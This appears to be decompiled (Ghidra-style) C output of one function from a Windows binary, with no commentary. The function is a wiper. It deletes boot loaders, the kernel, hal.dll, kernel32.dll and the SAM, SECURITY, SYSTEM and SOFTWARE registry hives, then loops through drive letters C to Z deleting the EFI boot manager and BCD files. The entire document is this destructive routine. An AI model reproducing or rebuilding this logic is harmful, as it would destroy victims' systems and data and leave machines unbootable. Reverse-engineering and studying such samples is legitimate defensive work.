
/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

void FUN_140011650(void)

{
  code *pcVar1;
  undefined8 *puVar2;
  LPCSTR ***ppppCVar3;
  ulonglong uVar4;
  ulonglong uVar5;
  byte bVar6;
  undefined1 auStack_d8 [40];
  ulonglong local_b0 [4];
  LPCSTR **local_90;
  undefined8 uStack_88;
  undefined8 local_80;
  ulonglong uStack_78;
  LPCSTR **local_70;
  undefined8 uStack_68;
  undefined8 local_60;
  ulonglong uStack_58;
  LPCSTR **local_50;
  undefined8 uStack_48;
  undefined8 local_40;
  ulonglong uStack_38;
  ulonglong local_30;
  
  local_30 = DAT_140068100 ^ (ulonglong)auStack_d8;
  DeleteFileA("C:\\Windows\\System32\\winload.exe");
  DeleteFileA("C:\\Windows\\System32\\winresume.exe");
  DeleteFileA("C:\\Windows\\System32\\winload.efi");
  DeleteFileA("C:\\Windows\\System32\\winresume.efi");
  DeleteFileA("C:\\Windows\\System32\\bootmgr");
  DeleteFileA("C:\\Windows\\System32\\bootmgfw.efi");
  DeleteFileA("C:\\Windows\\System32\\hal.dll");
  DeleteFileA("C:\\Windows\\System32\\ntoskrnl.exe");
  DeleteFileA("C:\\Windows\\System32\\kernel32.dll");
  DeleteFileA("C:\\Windows\\System32\\config\\SAM");
  DeleteFileA("C:\\Windows\\System32\\config\\SECURITY");
  DeleteFileA("C:\\Windows\\System32\\config\\SYSTEM");
  DeleteFileA("C:\\Windows\\System32\\config\\SOFTWARE");
  DeleteFileA("C:\\boot.ini");
  DeleteFileA("C:\\ntldr");
  DeleteFileA("C:\\bootmgr");
  DeleteFileA("C:\\bootmgr.efi");
  bVar6 = 0x43;
  do {
    local_b0[1] = 0;
    local_b0[2] = 1;
    local_b0[3] = 0xf;
    local_b0[0] = (ulonglong)bVar6;
    puVar2 = (undefined8 *)FUN_1400183c0(local_b0,":\\EFI\\Microsoft\\Boot\\bootmgfw.efi",0x21);
    local_50 = (LPCSTR **)*puVar2;
    uStack_48 = puVar2[1];
    local_40 = puVar2[2];
    uStack_38 = puVar2[3];
    puVar2[2] = 0;
    puVar2[3] = 0xf;
    *(undefined1 *)puVar2 = 0;
    if (0xf < local_b0[3]) {
      uVar4 = local_b0[3] + 1;
      uVar5 = local_b0[0];
      if (uVar4 < 0x1000) {
LAB_1400117eb:
        FUN_140026c34(uVar5,uVar4);
        goto LAB_1400117f0;
      }
      uVar5 = *(ulonglong *)(local_b0[0] - 8);
      if ((local_b0[0] - uVar5) - 8 < 0x20) {
        uVar4 = local_b0[3] + 0x28;
        goto LAB_1400117eb;
      }
LAB_140011a59:
      pcVar1 = (code *)swi(0x29);
      (*pcVar1)(5);
LAB_140011a60:
      pcVar1 = (code *)swi(0x29);
      (*pcVar1)(5);
      pcVar1 = (code *)swi(3);
      (*pcVar1)();
      return;
    }
LAB_1400117f0:
    ppppCVar3 = &local_50;
    if (0xf < uStack_38) {
      ppppCVar3 = (LPCSTR ***)local_50;
    }
    DeleteFileA((LPCSTR)ppppCVar3);
    local_b0[1] = 0;
    local_b0[2] = 1;
    local_b0[3] = 0xf;
    local_b0[0] = (ulonglong)bVar6;
    puVar2 = (undefined8 *)FUN_1400183c0(local_b0,":\\EFI\\Microsoft\\Boot\\BCD",0x18);
    local_70 = (LPCSTR **)*puVar2;
    uStack_68 = puVar2[1];
    local_60 = puVar2[2];
    uStack_58 = puVar2[3];
    puVar2[2] = 0;
    puVar2[3] = 0xf;
    *(undefined1 *)puVar2 = 0;
    if (0xf < local_b0[3]) {
      uVar4 = local_b0[3] + 1;
      uVar5 = local_b0[0];
      if (uVar4 < 0x1000) {
LAB_14001189c:
        FUN_140026c34(uVar5,uVar4);
        goto LAB_1400118a1;
      }
      uVar5 = *(ulonglong *)(local_b0[0] - 8);
      if ((local_b0[0] - uVar5) - 8 < 0x20) {
        uVar4 = local_b0[3] + 0x28;
        goto LAB_14001189c;
      }
LAB_140011a52:
      pcVar1 = (code *)swi(0x29);
      (*pcVar1)(5);
      goto LAB_140011a59;
    }
LAB_1400118a1:
    ppppCVar3 = &local_70;
    if (0xf < uStack_58) {
      ppppCVar3 = (LPCSTR ***)local_70;
    }
    DeleteFileA((LPCSTR)ppppCVar3);
    local_b0[1] = 0;
    local_b0[2] = 1;
    local_b0[3] = 0xf;
    local_b0[0] = (ulonglong)bVar6;
    puVar2 = (undefined8 *)FUN_1400183c0(local_b0,":\\Boot\\BCD",10);
    local_90 = (LPCSTR **)*puVar2;
    uStack_88 = puVar2[1];
    local_80 = puVar2[2];
    uStack_78 = puVar2[3];
    puVar2[2] = 0;
    puVar2[3] = 0xf;
    *(undefined1 *)puVar2 = 0;
    if (0xf < local_b0[3]) {
      uVar4 = local_b0[3] + 1;
      uVar5 = local_b0[0];
      if (0xfff < uVar4) {
        uVar5 = *(ulonglong *)(local_b0[0] - 8);
        if (0x1f < (local_b0[0] - uVar5) - 8) goto LAB_140011a52;
        uVar4 = local_b0[3] + 0x28;
      }
      FUN_140026c34(uVar5,uVar4);
    }
    ppppCVar3 = &local_90;
    if (0xf < uStack_78) {
      ppppCVar3 = (LPCSTR ***)local_90;
    }
    DeleteFileA((LPCSTR)ppppCVar3);
    if (0xf < uStack_78) {
      uVar5 = uStack_78 + 1;
      ppppCVar3 = (LPCSTR ***)local_90;
      if (0xfff < uVar5) {
        ppppCVar3 = (LPCSTR ***)local_90[-1];
        if ((LPCSTR)0x1f < (LPCSTR)((longlong)local_90 + (-8 - (longlong)ppppCVar3)))
        goto LAB_140011a52;
        uVar5 = uStack_78 + 0x28;
      }
      FUN_140026c34(ppppCVar3,uVar5);
    }
    local_80 = 0;
    uStack_78 = 0xf;
    local_90 = (LPCSTR **)((ulonglong)local_90 & 0xffffffffffffff00);
    if (0xf < uStack_58) {
      uVar5 = uStack_58 + 1;
      ppppCVar3 = (LPCSTR ***)local_70;
      if (0xfff < uVar5) {
        ppppCVar3 = (LPCSTR ***)local_70[-1];
        if ((LPCSTR)0x1f < (LPCSTR)((longlong)local_70 + (-8 - (longlong)ppppCVar3)))
        goto LAB_140011a59;
        uVar5 = uStack_58 + 0x28;
      }
      FUN_140026c34(ppppCVar3,uVar5);
    }
    local_60 = 0;
    uStack_58 = 0xf;
    local_70 = (LPCSTR **)((ulonglong)local_70 & 0xffffffffffffff00);
    if (0xf < uStack_38) {
      uVar5 = uStack_38 + 1;
      ppppCVar3 = (LPCSTR ***)local_50;
      if (0xfff < uVar5) {
        ppppCVar3 = (LPCSTR ***)local_50[-1];
        if ((LPCSTR)0x1f < (LPCSTR)((longlong)local_50 + (-8 - (longlong)ppppCVar3)))
        goto LAB_140011a60;
        uVar5 = uStack_38 + 0x28;
      }
      FUN_140026c34(ppppCVar3,uVar5);
    }
    bVar6 = bVar6 + 1;
    if ('Z' < (char)bVar6) {
      return;
    }
  } while( true );
}

